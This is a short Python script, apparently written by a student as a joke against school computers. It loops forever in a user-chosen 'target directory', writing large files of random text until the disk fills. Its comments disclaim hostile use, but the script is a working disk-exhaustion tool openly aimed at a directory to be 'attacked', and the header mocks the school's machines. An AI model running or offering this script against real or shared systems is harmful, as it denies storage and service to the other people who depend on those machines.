# THIS PROGRAM WAS MADE AS A JOKE AND A TEST OF WHAT WAS POSSIBLE ON SCHOOL COMPUTERS.
# THIS IS NOT TO BE USED IN A HOSTILE SETTING, I AM NOT RESPONSIBLE FOR THE MISSUSE OF THIS PROGRAM.
# THIS CODE WAS WRITEN BY CLOVER C. >:3 FUCK MY SCHOOL'S COMPUTERS LOL.
# THIS PROGRAM REPEATEDLY MAKES TEXT FILES FILLED WITH RANDOMLY GENERATED TEXT.
# I GUESS THIS COULD BE USED AS A STRESS TEST BUT I LITTERLY MADE THIS BECAUSE I WAS BORED IN SENIOR CAPSTONE
import os  # imports required modules
import secrets
import string
import shutil
import io
letters = string.ascii_letters  # These two lines of code tell the program what characters can use
digits = string.digits
alphabet = letters + digits	 # Adds the values into the "alphabet" variable

pwd_length = 12  # Tells the program how long the string of characters should be
pwd_length2 = 5000
pwd_length3 = 7000
# tells the program to ask the user for the directory to be "attacked"
path = input('paste target directory')  # sets path as user inputed path, assumes all inputs are valid.

Times = '0'  # sets the "Times" variable to 0, this is uesd to count the amount of folders made.
while True:	 # "While True" means the loop will go infinatly due to it not having a False condition
    pwd = ''  # Sets "pwd" 1-3 to a blank variable to allow for generated value to be stored and clears variable every loop
    pwd2 = ''
    pwd3 = ''
    for i in range(pwd_length):  # Tells program to only generate 12 digits
        pwd += ''.join(secrets.choice(alphabet))  # generates the 12 character string and stores it in "pwd"
    for i in range(pwd_length2):
        pwd2 += ''.join(secrets.choice(alphabet))
    for i in range(pwd_length3):
        pwd3 += ''.join(secrets.choice(alphabet))
    stat = shutil.disk_usage(path)  # Tells the program what path to check the storage usage of.
    int(Times)  # sets "Times" to an "int()" value so it can be used in equations
    os.chdir(path)  # sets current Directory to the correct folder
    f = open(pwd + ".txt", "w")
    f.write(pwd2 + pwd + pwd3 + pwd + pwd2 + pwd + pwd3 + pwd + pwd2 + pwd + pwd3 + pwd + pwd2 + pwd + pwd3 + pwd2 + pwd2 + pwd2 + pwd3 + pwd2 + pwd2 + pwd + pwd2 + pwd2 + pwd2 + pwd2 + pwd2 + pwd3 + pwd2 + pwd2 + pwd2 + pwd + pwd3 + pwd2 + pwd + pwd2)
    f.close()
    Times = int(Times) + 1  # adds 1 to the "Times" variable so it accuratly reflects the ammount of times this loop has run
    print('folder ' + pwd + ' made\n' + str(int(Times)) + ' folders made\n' 'disk space = ' + str(stat))
    # prints the text "File (generated string) made (Number of loops) files made disk space = (usage statistics)"
